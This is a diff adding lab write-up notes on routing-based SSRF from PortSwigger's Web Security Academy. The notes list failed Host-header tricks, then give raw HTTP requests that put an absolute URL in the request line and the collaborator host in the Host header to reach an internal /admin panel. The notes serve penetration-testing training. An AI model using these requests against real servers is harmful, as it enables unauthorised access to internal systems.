@@ -24,3 +24,46 @@ Objective: Access the internal admin panel located in the 192.168.0.0/24 range, 
 * Set Host header value to Burp Collaborator, repeat the request and notice that you recieve a HTTP request.
 * Send this request to intruder and set the host header value as Host: 192.168.0.§0§ and bruteforce it from 0 to 255. Dont forget to disanle **Update Host Header to match target** option.
 * You will notice 302 in one request, redirecting you to /admin, use that request to delete carlos user.
+### 5. SSRF via flawed request parsing
+**Objective**: This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address. To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete the user carlos.
+* Tried BurpColloborator hostname in Host header, didn't work.
+* Tried subdomain of website in host header, no success.
+* Tried LEGITHOSTNAME.xyz, didn't work
+* Double host header injected, didn't work. Always try both ways legit host first, malicious later and malicous first, legit later.
+* One more interesting test case we can try here is that injecting absolute URL in the request line as shown below. Tried it both the ways too.
+```
+GET https://BURP/ HTTP/2
+Host: 0ade00b204dfd3fe812fad16004200bb.web-security-academy.net
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: https://portswigger.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=0, i
+```
+Didn't work. Below one worked for us.
+```
+GET https://0ade00b204dfd3fe812fad16004200bb.web-security-academy.net/ HTTP/2
+Host: BURP
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: https://portswigger.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=0, i
+```
+It is redirecting to /admin, but we cannnot add /admin in host header. Lets add it in absolute URL.
+```
+GET https://0ade00b204dfd3fe812fad16004200bb.web-security-academy.net/admin HTTP/2
+Host: BURP
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: https://portswigger.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=0, i
+```
+Admin portal opened.
